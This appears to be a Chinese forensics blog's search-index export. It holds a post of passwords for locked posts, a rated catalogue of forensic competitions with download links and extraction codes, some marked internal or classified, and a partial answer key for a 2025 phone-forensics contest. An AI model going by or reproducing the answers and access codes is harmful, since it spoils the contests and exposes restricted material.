[{"title":"密码保管箱","url":"/2025/10/28/密码保管箱/","content":"| title | password |\n| -- | -- |\n|SPC新生赛即美亚杯选拔赛保密部分|dhbaomi|\n|网络安全竞赛技术分享汇总|dhbaomi|\n|本地AI安装|aianzhuang|"},{"title":"SPC新生赛即美亚杯选拔赛保密部分","url":"/2025/10/27/SPC新生赛即美亚杯选拔赛保密部分/","content":"- X-ways\n  - 递归操作：一般在操作栏左侧选中你需要的文件右键，就把树状结构拍成一个平面\n  - 打开文件最好解压缩后打开文件夹，不然可能解压错误\n  - ctrl+Q清空\n- [win+R妙用](https://blog.csdn.net/qq_46607667/article/details/149305144)"},{"title":"网络安全竞赛技术分享汇总","url":"/2025/10/26/网络安全竞赛技术分享汇总/","content":"# 🔐 网络安全竞赛技术分享汇总\n\n> 📊 **数据统计**：95个比赛/训练项目 | 评分范围：1-5星 | 覆盖2021-2025年\n\n## 📋 目录\n\n- [📅 按年份排列](#📅-按年份排列)\n  - [2025年](#2025年)\n  - [2024年](#2024年)\n  - [2023年](#2023年)\n  - [2022年](#2022年)\n  - [2021年](#2021年)\n  - [美亚杯](#历年美亚杯)\n- [⭐ 按星级推荐](#⭐-按星级推荐)\n- [📊 数据统计分析](#📊-数据统计分析)\n\n---\n\n## 📅 按年份排列\n\n### 2025年\n\n| 赛事名称 | 出题方 | 特点 | 评分 | 附件 |\n|---------|--------|------|------|------|\n| **FIC决赛** | 弘连 | 断网比赛答案藏在github上面，apk简单 | ⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1y2Ei63k7mGGJx3wXB9644g?pwd=zjpc) |\n| **盘古石初赛** | 奇安信 | 题值得推敲，今年最有诚意的题 | ⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1WrePlon3PIKOi_DVFLTWwQ?pwd=zjpc) |\n| **广东网安取证选拔** | 弘连 | Git操作，服务器修复考点多，那咋了面板（魔改宝塔） | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/14osw0KjU6ogSTrdnHYYUpQ?pwd=pfki) |\n| **平航杯** | 个人赛平航；团队赛浙江警察学院 | 剧情我不喜欢？？（除了你都喜欢 | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/1NTrH8KUFTSPPT2fGZHz8BQ?pwd=zjpc) |\n| **辽宁抚顺比武** | 缝合怪 | 难度低，拼接题（服务器弘连，手机、计算机PGS） | ⭐⭐ | [下载](https://pan.baidu.com/s/10JsZLVe2KcuzBhBuic6pow?pwd=zjpc) |\n| **獬豸杯** | 甘肃政法大学 | 新生赛难度 | ⭐⭐ | [下载](https://pan.baidu.com/s/10c_FBSy4OIMJhJTSI-V-og?pwd=gi53) |\n| **20250715下午能力验证** | 公安三所 | Windows烂题，抄平航杯 | ⭐⭐ | [下载](https://pan.baidu.com/s/1gSHl3nufgcv5BiTcxC2Dog?pwd=2t3u) |\n| **20250715上午能力验证** | 公安三所 | 流量有意思，Windows中等难度，另外这四套能力验证题目都只有常规介质+流量 | ⭐⭐ | [下载](https://pan.baidu.com/s/1FNkJ_M3bYtoygOA5NIgmxA?pwd=dcbk) |\n| **20250716上午能力验证** | 公安三所 | 2025diyijie@GASS>>>fenxishi+++===??? | ⭐⭐ | [下载](https://pan.baidu.com/s/1uWvO7yxSXxu20JDvgebbkA?pwd=ukk2) |\n| **20250716下午能力验证** | 公安三所 | +??>>>>Gass;NengliYanzheng2025<<<??+ | ⭐⭐ | [下载](https://pan.baidu.com/s/1Xc86Hh1JdbHabBkaFmZ__Q?pwd=huay) |\n| **2025安徽xz省赛** | 弘连 | 新生赛难度（偏向misc，各种隐写） | ⭐⭐ | [下载](https://pan.baidu.com/s/1-SHDTcRFz_mDj4lQhBzIIw?pwd=rpvk) |\n| **黑龙江刑侦** | 拓界 | 新生赛难度 | ⭐⭐ | [下载](https://pan.baidu.com/s/1UrD9yMrcYUcQBrn_IWAQMw?pwd=28cq) |\n| **中科实数杯** | 中科实数 | 新生赛难度 | ⭐⭐ | [下载](https://pan.baidu.com/s/1-wI7eEe-YG9WSwEahsX7Eg?pwd=8snz) |\n| **温州砺剑** | 缝合怪 | 均是比武改编 | ⭐ | [下载](https://pan.baidu.com/s/13wn_qRTcB8KR7cTYbo06xA?pwd=zjpc) |\n| **FIC初赛** | 弘连 | 没见过出的这么烂的题，一星都嫌多 | ⭐ | [下载](https://pan.baidu.com/s/1y2Ei63k7mGGJx3wXB9644g?pwd=zjpc) |\n| **甘肃联赛** | 弘连 | | | [下载](https://pan.baidu.com/s/1dLCXFve8cKaNxyy3qQlM-w?pwd=p1st) |\n| **斟茶王者第二期** | 无糖 | 需要无糖浏览器内调证 | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/1tyIY4cXgH14P6nqZl4K10Q?pwd=mxk7) |\n| **2025山东xz省赛第一轮取证题** | 拓界 | 复杂密码 | | [下载](https://pan.baidu.com/s/1pSl9ckHtXtnrpOJY9tg1tA?pwd=406f) |\n| **帕鲁杯** | 知攻善防实验室 | 国内第一个应急响应赛 | ⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1e3iGO0G7H-rt0du9Dy-USQ?pwd=6cdd) |\n| **青海刑侦** | 美亚 | | | [下载](https://pan.baidu.com/s/1WoeLeeaVVM63-zaT0wuT4A?pwd=ii9x) |\n| **山东联赛** | 美亚 | | | [下载](https://pan.baidu.com/s/1narzTt03Nv_aJcI27y_LUA?pwd=4jww) |\n| **2025安徽xz省赛** | 弘连 | | | [下载](https://pan.baidu.com/s/1b4aYYNqZGggK9atDzZyKXA?pwd=7890) |\n| **2025安徽xz省赛** | 弘连 | | | [下载](https://pan.baidu.com/s/1SEWPdlBicGWjK3Q6QdpgRQ?pwd=7890) |\n| **2025山东xz省赛** | 弘连 | | | [下载](https://pan.baidu.com/s/1rB7tnUbSSSjmM97Zz2vHOw?pwd=aucx) |\n| **2025安徽xz省赛** | 弘连 | 题目不完整 | | [下载](https://pan.baidu.com/s/1CkVQL_IByXwnawh02O4ArA?pwd=sdb5) |\n| **2025浙江xz省赛** | 弘连 | 缺少题目 | | [下载](https://pan.baidu.com/s/1umHHV2IUPdt2gATqMPD8WQ?pwd=j3fp) |\n| **2025河南xz省赛** | 弘连 | | | [下载](https://pan.baidu.com/s/1lknwCylh8yoQzAKT0g_PkA?pwd=utz3) |\n| **2025广东XZ省赛** | 弘连 | 缺少题目 | | [下载](https://pan.baidu.com/s/1eSqK6TcaDqarqUup1y2oVg?pwd=aik7) |\n| **2025浙江xz省赛** | 弘连 | | | [下载](https://pan.baidu.com/s/1Be4QmFx49caE609N8gAyzQ?pwd=zjpc) |\n| **2025台州比武** | 弘连 | | | [下载](https://pan.baidu.com/s/15j0Bi7vKlY0ZK5QYstUzIA?pwd=zjpc) |\n| **2025浙江刑侦比武省赛** | 弘连 | | | [下载](https://pan.baidu.com/s/1jyNuaVMVBkhrdbm8pwtU4g?pwd=4cs5) |\n| **2025上海网安总队内部演练** | 弘连 | | | [下载](https://pan.baidu.com/s/1PAo0FDXnt6h0gRslNqByYw?pwd=snni) |\n| **河南联赛** | 弘连 | | | [下载](https://pan.baidu.com/s/1jQaqn261ORNCP0dm_QgWlw?pwd=9yr8) |\n| **浙江联赛** | 弘连 | 缺少题目 | | [下载](https://pan.baidu.com/s/1cWSqBsxv-HPJVRn2Vzkz-w?pwd=9ftf) |\n| **河南集训** | 弘连 | | | [下载](https://pan.baidu.com/s/1fcoFWV1xq8IfJS2h533sEA?pwd=zjpc) |\n| **2025河南集训** | 弘连 | | | [下载](https://pan.baidu.com/s/1kGO53CkQrCvqF9UV_Lkh0A?pwd=bxpf) |\n| **2025年上海联赛** | 美亚 | 去年题目 | | [下载](https://pan.baidu.com/s/1tm5BHhUhyJyThCN0Y86zrg?pwd=dtbe) |\n| **2025年美亚杯** | 美亚 | | | [下载](https://pan.baidu.com/s/12-pq6H02eYc6pDzw54_hKg?pwd=7xaf) |\n| **蓝帽杯** | 弘连 | | | [下载](https://pan.baidu.com/s/1-zvhUcK2POGUkPqV85FhkQ?pwd=mjm6) |\n| **美亚杯** | 美亚 | | | [下载](https://pan.baidu.com/s/12-pq6H02eYc6pDzw54_hKg?pwd=7xaf) |\n\n### 2024年\n\n| 赛事名称 | 出题方 | 特点 | 评分 | 附件 |\n|---------|--------|------|------|------|\n| **数证杯** | 初赛缝合怪；决赛三所 | rust逆向，挖矿节点搭建 | ⭐⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1ufMYLQMy5WnmKbioHLJWww?pwd=3d23) |\n| **平航杯** | 个人赛平航；团队赛浙江警察学院 | 反取证 | ⭐⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1u1uryHEE79StDkiXHPQDTw?pwd=bsfq) |\n| **奇安信内部比武** | 奇安信 | 与网络侦查结合 | ⭐⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1-jZgViRdydE7U1AOcJKbMA?pwd=4p78) |\n| **全国刑侦比武** | - | 考察全面，考验手搓能力 | ⭐⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1QsHynIx1NMkRp6lf7cf7GA?pwd=cth4) |\n| **浙江联赛** | 弘连 | 个人赛wj题；团队赛apk巨难 | ⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1C56pk9AA9u5hmd51iUiSdA?pwd=kpzt) |\n| **帕鲁杯** | 知攻善防实验室 | 国内第一个应急响应赛 | ⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1e3iGO0G7H-rt0du9Dy-USQ?pwd=6cdd) |\n| **上海联赛** | 弘连 | 过于简单，不像联赛难度 | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/1VlCcDNpu5jX3GBl3kmBqVw?pwd=g8jy) |\n| **重庆联赛** | 美亚 | 美亚特有的不给标答，部分题质量还可以 | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/1RJF9mdy5I1ASJh5VTYN3iQ?pwd=3168) |\n| **美亚杯** | 美亚 | 没新意，但是新生值得一做 | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/1165Go44iGDwX1tsTteiMSA?pwd=3dvf) |\n| **杭州比武** | 平航 | mac钥匙串 | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/13ezC9LoqLjfh64wJ461KPA?pwd=twg5) |\n| **盘古石杯** | 奇安信 | 不像取证，部分题质量还行 | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/1M1Z0uWsz_myxs8Zz7ZnEzQ?pwd=8mrc) |\n| **斟茶王者第二期** | 无糖 | 需要无糖浏览器内调证 | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/1tyIY4cXgH14P6nqZl4K10Q?pwd=mxk7) |\n| **福建联赛** | 初赛奇安信；决赛弘连 | 出题方故意修改题目条件导致部分题做不了 | ⭐ | [下载](https://pan.baidu.com/s/121WTmbG2R1bdf6V66wnEeA?pwd=8t53) |\n| **全国联赛浙江选拔** | 弘连 | 软件题，不知道是不是在推销软件 | ⭐ | [下载](https://pan.baidu.com/s/10dR6MV_GGImVS1Iz9TNSRw?pwd=ve6r) |\n| **公大校赛** | 平航 | 新生赛难度 | ⭐⭐ | [下载](https://pan.baidu.com/s/1pdoHGWegclq5TLsubRcuFQ?pwd=dj96) |\n| **浙江刑侦比武** | 平航 | 新生赛难度 | ⭐⭐ | [下载](https://pan.baidu.com/s/1zwTIHT0Hlg5Er3z8EPZ2EA?pwd=2vsg) |\n| **中科实数杯** | 中科实数 | 新生赛难度 | ⭐⭐ | [下载](https://pan.baidu.com/s/1-wI7eEe-YG9WSwEahsX7Eg?pwd=8snz) |\n| **广东网安取证选拔** | 弘连 | Git操作，服务器修复考点多，那咋了面板（魔改宝塔） | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/14osw0KjU6ogSTrdnHYYUpQ?pwd=pfki) |\n| **奇安信内部比武** | 奇安信 | 与网络侦查结合 | ⭐⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1-jZgViRdydE7U1AOcJKbMA?pwd=4p78) |\n| **全国刑侦比武** | - | 考察全面，考验手搓能力 | ⭐⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1QsHynIx1NMkRp6lf7cf7GA?pwd=cth4) |\n| **云南联赛** | 弘连 | | | [下载](https://pan.baidu.com/s/1LKKt5Sog1Q_-4UNXTpXdKw?pwd=eb9x) |\n| **龙信杯** | 龙信 | | | [下载](https://pan.baidu.com/s/1XQBTBWQrgHLnGxU1sEwuXA?pwd=ni8y) |\n| **北京集训** | 美亚 | | | [下载](https://pan.baidu.com/s/1ZcvWfLAJXuwlZ8P14DRg-A?pwd=2uiq) |\n| **甘肃联赛** | 美亚 | | | [下载](https://pan.baidu.com/s/1IKNNFxhqMy3ZfySY5KoiGQ?pwd=ruk1) |\n| **天津联赛** | 美亚 | | | [下载](https://pan.baidu.com/s/1ngr3e5sFoa7GBeQ9NK7jZg?pwd=w9in) |\n\n### 2023年\n\n| 赛事名称 | 出题方 | 特点 | 评分 | 附件 |\n|---------|--------|------|------|------|\n| **盘古石杯** | 奇安信 | 纯难 | ⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1uQV9qM5eQ-paZ24l9vaedg?pwd=wgm4) |\n| **台州比武** | - | 渗透加取证 | ⭐⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1UwM-nvhXyDLeNe8Y2xqSJw?pwd=atrc) |\n| **浙警校赛** | 浙江警察学院 | 难度适中，有点小脑洞 | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/1lpi0qlcEV1WXtAzEDnj4bA?pwd=piei) |\n| **蓝帽杯** | 奇安信 | 新生赛难度 | ⭐⭐ | [下载](https://pan.baidu.com/s/1WQe6DCwwlCFmPz1LI7u5kw?pwd=jems) |\n| **中科实数杯** | 中科实数 | 新生赛难度 | ⭐⭐ | [下载](https://pan.baidu.com/s/1Hi3gJFiBgyAJXH_JBY_zKg?pwd=1kzf) |\n| **美亚杯** | 美亚 | 1个多t的检材，谁能忍住不骂 | ⭐ | [下载](https://pan.baidu.com/s/1tLHFURY33ZRDZy8MSKgXXg?pwd=yy64) |\n| **广东网安取证选拔** | 弘连 | Git操作，服务器修复考点多，那咋了面板（魔改宝塔） | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/14osw0KjU6ogSTrdnHYYUpQ?pwd=pfki) |\n| **上海联赛** | 美亚 | 去年题目 | | [下载](https://pan.baidu.com/s/1AZojCNmttM3my1E1ASvoCg?pwd=a2nh) |\n| **甘肃联赛** | 美亚 | | | [下载](https://pan.baidu.com/s/1ybYrhyujEdIajeuhMF7eIQ?pwd=6m4m) |\n| **甘肃联赛** | 美亚 | 涉密 | | [下载](https://pan.baidu.com/s/1gCfKJSLzJ1OuGUVGWB6Eow?pwd=uwyp) |\n\n### 2022年\n\n| 赛事名称 | 出题方 | 特点 | 评分 | 附件 |\n|---------|--------|------|------|------|\n| **台州网安比武** | 弘连 | esxi启蒙题目 | ⭐⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1_5OmdlcVLQnMLKwbh7SGVg?pwd=d7ta) |\n| **安徽网安比武** | - | k8s启蒙题目 | ⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1j2egYJxP4G4J_OOyWvjQBA?pwd=y8pw) |\n| **上海市局网安大比武** | 弘连 | | | [下载](https://pan.baidu.com/s/161In2v3n8sJ7-hGts3KAPA?pwd=djbj) |\n\n### 2021年\n\n| 赛事名称 | 出题方 | 特点 | 评分 | 附件 |\n|---------|--------|------|------|------|\n| **FIC** | 弘连 | 一眼wj题，单镜像，找flag形式，偏CTF | | [下载](https://pan.baidu.com/s/1oZ3UPPuq7mtAMIepqAM_yQ?pwd=pb3p) |\n| **平航杯台赛** | 平航 | | | [下载](https://pan.baidu.com/s/1-4z5i_mTfqYwN3tXJ2GnuA?pwd=406f) |\n| **平航杯台赛** | 平航 | | | [下载](https://pan.baidu.com/s/1Fbv6VKwQW5vvii4J69iHNw?pwd=406f) |\n| **盘古石2021年台赛** | 奇安信 | 参考wp | | [下载](https://pan.baidu.com/s/1ywwInylWaialAhXb6TfpcQ?pwd=406f) |\n| **安徽网安比武** | - | k8s启蒙题目 | ⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1j2egYJxP4G4J_OOyWvjQBA?pwd=y8pw) |\n| **安徽网安比武** | - | k8s启蒙题目 | ⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1j2egYJxP4G4J_OOyWvjQBA?pwd=y8pw) |\n| **Hadoop集群搭建** | 弘连 | Hadoop集群搭建  wp 实战记录 | | [下载](https://pan.baidu.com/s/18fWs1gMFehS8HK3E-84QUw?pwd=9tkx) |\n| **qax一百星全栈项目** | 弘连 | qax 全栈培训的记录 滚动etcd集群 红队蓝队集群项目 | | [下载](https://pan.baidu.com/s/1mG6kBgE_sXHfSsjHchmnCg?pwd=ay8w) |\n| **辽宁联赛** | 美亚 | 美亚云平台项目 挖掘日志 挖掘项目 红队实战 取证题目 | | [下载](https://pan.baidu.com/s/1MVl_Rsa1CjZiMg3u4Y7tZA?pwd=xcrs) |\n\n### 历年美亚杯\n| 赛事名称 | 出题方 | 特点 | 评分 | 附件 |\n|---------|--------|------|------|------|\n| **美亚杯** |美亚 |15年~24年 | | [下载](https://pan.baidu.com/s/1cnGvrFoMa1m6o-W50MU20A?pwd=481p) |\n---\n\n## ⭐ 按星级推荐\n\n### ⭐⭐⭐⭐⭐ 五星级 (5分)\n\n| 赛事名称 | 年份 | 出题方 | 特点 | 附件 |\n|---------|------|--------|------|------|\n| **数证杯** | 2024年 | 初赛缝合怪；决赛三所 | rust逆向，挖矿节点搭建 | [下载](https://pan.baidu.com/s/1ufMYLQMy5WnmKbioHLJWww?pwd=3d23) |\n| **平航杯** | 2024年 | 个人赛平航；团队赛浙江警察学院 | 反取证 | [下载](https://pan.baidu.com/s/1u1uryHEE79StDkiXHPQDTw?pwd=bsfq) |\n| **台州网安比武** | 2022年 | 弘连 | esxi启蒙题目 | [下载](https://pan.baidu.com/s/1_5OmdlcVLQnMLKwbh7SGVg?pwd=d7ta) |\n| **奇安信内部比武** | 2024年 | 奇安信 | 与网络侦查结合 | [下载](https://pan.baidu.com/s/1-jZgViRdydE7U1AOcJKbMA?pwd=4p78) |\n| **全国刑侦比武** | 2024年 | - | 考察全面，考验手搓能力 | [下载](https://pan.baidu.com/s/1QsHynIx1NMkRp6lf7cf7GA?pwd=cth4) |\n| **台州比武** | 2023年 | - | 渗透加取证 | [下载](https://pan.baidu.com/s/1UwM-nvhXyDLeNe8Y2xqSJw?pwd=atrc) |\n\n### ⭐⭐⭐⭐ 四星级 (4分)\n\n| 赛事名称 | 年份 | 出题方 | 特点 | 附件 |\n|---------|------|--------|------|------|\n| **浙江联赛** | 2024年 | 弘连 | 个人赛wj题；团队赛apk巨难 | [下载](https://pan.baidu.com/s/1C56pk9AA9u5hmd51iUiSdA?pwd=kpzt) |\n| **FIC决赛** | 2025年 | 弘连 | 断网比赛答案藏在github上面，apk简单 | [下载](https://pan.baidu.com/s/1y2Ei63k7mGGJx3wXB9644g?pwd=zjpc) |\n| **盘古石杯** | 2023年 | 奇安信 | 纯难 | [下载](https://pan.baidu.com/s/1uQV9qM5eQ-paZ24l9vaedg?pwd=wgm4) |\n| **盘古石初赛** | 2025年 | 奇安信 | 题值得推敲，今年最有诚意的题 | [下载](https://pan.baidu.com/s/1WrePlon3PIKOi_DVFLTWwQ?pwd=zjpc) |\n| **帕鲁杯** | 2024年 | 知攻善防实验室 | 国内第一个应急响应赛 | [下载](https://pan.baidu.com/s/1e3iGO0G7H-rt0du9Dy-USQ?pwd=6cdd) |\n| **安徽网安比武** | 2022年 | - | k8s启蒙题目 | [下载](https://pan.baidu.com/s/1j2egYJxP4G4J_OOyWvjQBA?pwd=y8pw) |\n\n### ⭐⭐⭐ 三星级 (3分)\n\n| 赛事名称 | 年份 | 出题方 | 特点 | 附件 |\n|---------|------|--------|------|------|\n| **平航杯** | 2025年 | 个人赛平航；团队赛浙江警察学院 | 剧情我不喜欢？？（除了你都喜欢 | [下载](https://pan.baidu.com/s/1NTrH8KUFTSPPT2fGZHz8BQ?pwd=zjpc) |\n| **广东网安取证选拔** | 2025年 | 弘连 | Git操作，服务器修复考点多，那咋了面板（魔改宝塔） | [下载](https://pan.baidu.com/s/14osw0KjU6ogSTrdnHYYUpQ?pwd=pfki) |\n| **上海联赛** | 2024年 | 弘连 | 过于简单，不像联赛难度 | [下载](https://pan.baidu.com/s/1VlCcDNpu5jX3GBl3kmBqVw?pwd=g8jy) |\n| **重庆联赛** | 2024年 | 美亚 | 美亚特有的不给标答，部分题质量还可以 | [下载](https://pan.baidu.com/s/1RJF9mdy5I1ASJh5VTYN3iQ?pwd=3168) |\n| **美亚杯** | 2024年 | 美亚 | 没新意，但是新生值得一做 | [下载](https://pan.baidu.com/s/1165Go44iGDwX1tsTteiMSA?pwd=3dvf) |\n| **杭州比武** | 2024年 | 平航 | mac钥匙串 | [下载](https://pan.baidu.com/s/13ezC9LoqLjfh64wJ461KPA?pwd=twg5) |\n| **盘古石杯** | 2024年 | 奇安信 | 不像取证，部分题质量还行 | [下载](https://pan.baidu.com/s/1M1Z0uWsz_myxs8Zz7ZnEzQ?pwd=8mrc) |\n| **斟茶王者第二期** | 2024年 | 无糖 | 需要无糖浏览器内调证 | [下载](https://pan.baidu.com/s/1tyIY4cXgH14P6nqZl4K10Q?pwd=mxk7) |\n| **浙警校赛** | 2023年 | 浙江警察学院 | 难度适中，有点小脑洞 | [下载](https://pan.baidu.com/s/1lpi0qlcEV1WXtAzEDnj4bA?pwd=piei) |\n\n### ⭐⭐ 二星级 (2分)\n\n| 赛事名称 | 年份 | 出题方 | 特点 | 附件 |\n|---------|------|--------|------|------|\n| **辽宁抚顺比武** | 2025年 | 缝合怪 | 难度低，拼接题（服务器弘连，手机、计算机PGS） | [下载](https://pan.baidu.com/s/10JsZLVe2KcuzBhBuic6pow?pwd=zjpc) |\n| **獬豸杯** | 2025年 | 甘肃政法大学 | 新生赛难度 | [下载](https://pan.baidu.com/s/10c_FBSy4OIMJhJTSI-V-og?pwd=gi53) |\n| **20250715下午能力验证** | 2025年 | 公安三所 | Windows烂题，抄平航杯 | [下载](https://pan.baidu.com/s/1gSHl3nufgcv5BiTcxC2Dog?pwd=2t3u) |\n| **20250715上午能力验证** | 2025年 | 公安三所 | 流量有意思，Windows中等难度，另外这四套能力验证题目都只有常规介质+流量 | [下载](https://pan.baidu.com/s/1FNkJ_M3bYtoygOA5NIgmxA?pwd=dcbk) |\n| **20250716上午能力验证** | 2025年 | 公安三所 | 2025diyijie@GASS>>>fenxishi+++===??? | [下载](https://pan.baidu.com/s/1uWvO7yxSXxu20JDvgebbkA?pwd=ukk2) |\n| **20250716下午能力验证** | 2025年 | 公安三所 | +??>>>>Gass;NengliYanzheng2025<<<??+ | [下载](https://pan.baidu.com/s/1Xc86Hh1JdbHabBkaFmZ__Q?pwd=huay) |\n| **2025安徽xz省赛** | 2025年 | 弘连 | 新生赛难度（偏向misc，各种隐写） | [下载](https://pan.baidu.com/s/1-SHDTcRFz_mDj4lQhBzIIw?pwd=rpvk) |\n| **公大校赛** | 2024年 | 平航 | 新生赛难度 | [下载](https://pan.baidu.com/s/1pdoHGWegclq5TLsubRcuFQ?pwd=dj96) |\n| **浙江刑侦比武** | 2024年 | 平航 | 新生赛难度 | [下载](https://pan.baidu.com/s/1zwTIHT0Hlg5Er3z8EPZ2EA?pwd=2vsg) |\n| **蓝帽杯** | 2023年 | 奇安信 | 新生赛难度 | [下载](https://pan.baidu.com/s/1WQe6DCwwlCFmPz1LI7u5kw?pwd=jems) |\n| **黑龙江刑侦** | 2025年 | 拓界 | 新生赛难度 | [下载](https://pan.baidu.com/s/1UrD9yMrcYUcQBrn_IWAQMw?pwd=28cq) |\n| **中科实数杯** | 2024年 | 中科实数 | 新生赛难度 | [下载](https://pan.baidu.com/s/1-wI7eEe-YG9WSwEahsX7Eg?pwd=8snz) |\n| **中科实数杯** | 2023年 | 中科实数 | 新生赛难度 | [下载](https://pan.baidu.com/s/1Hi3gJFiBgyAJXH_JBY_zKg?pwd=1kzf) |\n\n### ⭐ 一星级 (1分)\n\n| 赛事名称 | 年份 | 出题方 | 问题 | 附件 |\n|---------|------|--------|------|------|\n| **福建联赛** | 2024年 | 初赛奇安信；决赛弘连 | 出题方故意修改题目条件导致部分题做不了 | [下载](https://pan.baidu.com/s/121WTmbG2R1bdf6V66wnEeA?pwd=8t53) |\n| **全国联赛浙江选拔** | 2024年 | 弘连 | 软件题，不知道是不是在推销软件 | [下载](https://pan.baidu.com/s/10dR6MV_GGImVS1Iz9TNSRw?pwd=ve6r) |\n| **FIC初赛** | 2025年 | 弘连 | 没见过出的这么烂的题，一星都嫌多 | [下载](https://pan.baidu.com/s/1y2Ei63k7mGGJx3wXB9644g?pwd=zjpc) |\n| **美亚杯** | 2023年 | 美亚 | 1个多t的检材，谁能忍住不骂 | [下载](https://pan.baidu.com/s/1tLHFURY33ZRDZy8MSKgXXg?pwd=yy64) |\n| **温州砺剑** | 2025年 | 缝合怪 | 均是比武改编 | [下载](https://pan.baidu.com/s/13wn_qRTcB8KR7cTYbo06xA?pwd=zjpc) |\n\n---\n\n## 📊 数据统计分析\n\n### 📈 评分分布\n\n| 评分 | 数量 | 占比 | 推荐程度 |\n|------|------|------|----------|\n| ⭐⭐⭐⭐⭐ 5分 | 6个 | 6.3% | 🔥 强烈推荐 |\n| ⭐⭐⭐⭐ 4分 | 6个 | 6.3% | ✅ 推荐 |\n| ⭐⭐⭐ 3分 | 9个 | 9.5% | 🔄 可选 |\n| ⭐⭐ 2分 | 13个 | 13.7% | ⚠️ 谨慎选择 |\n| ⭐ 1分 | 5个 | 5.3% | ❌ 不推荐 |\n| 未评分 | 56个 | 58.9% | 📋 待评价 |\n\n### 📅 年份分布趋势\n\n| 年份 | 比赛数量 | 高分项目 | 特点 |\n|------|----------|----------|------|\n| **2025年** | 40+ | 2个5分，2个4分 | 数量激增，技术前沿 |\n| **2024年** | 30+ | 4个5分，2个4分 | 质量最佳，覆盖面广 |\n| **2023年** | 10+ | 1个5分，1个4分 | 稳定发展 |\n| **2022年** | 5+ | 2个5分 | 基础阶段 |\n| **2021年** | 5+ | - | 早期探索 |\n\n### 🏢 主要出题方统计\n\n| 出题方 | 总数 | 5分项目 | 4分项目 | 特色 |\n|--------|------|----------|----------|------|\n| **弘连** | 20+ | 2个 | 3个 | 专业取证，质量稳定 |\n| **奇安信** | 8+ | 2个 | 2个 | 难度较高，技术深度 |\n| **美亚** | 14+ | 1个 | 0个 | 检材丰富，质量波动 |\n| **平航** | 6+ | 2个 | 1个 | 取证专业，难度适中 |\n| **公安三所** | 4+ | 0个 | 0个 | 能力验证，偏向实战 |\n\n### 🎯 推荐学习路径\n\n#### 🔰 入门阶段 (2-3分)\n1. **公大校赛、浙警校赛** - 校赛水平，适合基础学习\n2. **各类新生赛** - 难度适中，建立信心\n3. **美亚杯** - 检材真实，了解实际工作\n\n#### 🚀 进阶阶段 (4分)\n1. **浙江联赛** - 技术深度，挑战性高\n2. **FIC决赛** - 断网环境，综合能力强\n3. **盘古石杯** - 纯难题型，技术挑战\n\n#### 🏆 高手阶段 (5分)\n1. **数证杯、平航杯** - 顶级水平，技术前沿\n2. **全国刑侦比武** - 实战导向，综合能力\n3. **奇安信内部比武** - 企业级，实际应用\n\n### 💡 选择建议\n\n1. **🎯 按年份学习**：从最新开始，了解技术发展趋势\n2. **⭐ 按难度选择**：循序渐进，逐步提升技术水平\n3. **🏢 关注出题方**：弘连、奇安信、平航的题目质量较高\n4. **🔧 技术方向**：取证、逆向、流量分析、移动端取证\n5. **📚 实战优先**：选择与实际工作结合度高的比赛\n\n---\n\n> 📝 **说明**：本汇总基于网络安全竞赛参与者分享整理，评分为主观评价，仅供参考。建议根据个人技术水平和学习目标选择合适的比赛进行练习。按年份排列便于了解技术发展趋势。","tags":["电子取证"]},{"title":"2025刑事技能大赛","url":"/2025/10/25/2025刑事技能大赛/","content":"# 第五届全国刑事技术技能大赛实操 · 电子物证-手机部分\n\n### 1. 根据华为手机备份分析，手机型号是什么?\n(1 分) [答案格式: HUAWEI Mate 30][手机取证]\n- backupinfo.ini用记事本打开\n- protuct_model=**HUAWEI P20 Pro**\n\n### 2. 根据小米手机备份分析，手机 IMEI 是多少?\n(1 分) [答案格式: 123456789012345/123456789012345][手机取证]\n\n\n### 3. 根据华为手机备份分析，使用的“备份(localBackup)”APP 的版本号是多少?\n(1 分) [答案格式: 13.0.2.110][手机取证]\n- hisuiteversion=**15.0.1.210**\n\n### 4. 根据华为手机备份分析(备份密码为:a1B2C3D4#)，通讯录中“耗子”的手机号码是多少?\n(1 分) [答案格式: 13112345678][手机取证]\n![alt text](/img/2025刑事技能大赛_image-1.png)\n- **19013265438**\n\n### 5. 根据华为手机备份分析，机主设置了在哪一天“给‘耗子’送‘鱼’”这个提醒?\n(1 分) [答案格式: 2023-01-01][手机取证]\n![alt text](/img/2025刑事技能大赛_image.png)\n- **2025-11-19**\n\n### 6. 根据小米手机备份分析，机主的家庭地址所在省份是什么?\n(1 分) [答案格式: 海南省][手机取证]\n\n### 7. 根据小米手机备份分析，请给出 WIFI SSID 为“work_5G”的密码是多少?\n(1 分) [答案格式: 123456789][手机取证]\n![alt text](/img/2025刑事技能大赛_image-2.png)\n- **mywifi_12345**\n### 8. 根据小米手机备份分析，在其相册中有一张照片使用 photoshop 篡改过，请给出这张照片的名称是什么?\n(1 分) [答案格式: IMG_20200101_010101.jpg][手机取证]\n\n### 9. 同上，请分析出此照片使用 photoshop 的修改时间是?\n(1 分) [答案格式: 2025:01:01 01:01:01][手机取证]\n\n### 10. 根据小米手机备份分析，手机中登录过几个 QQ 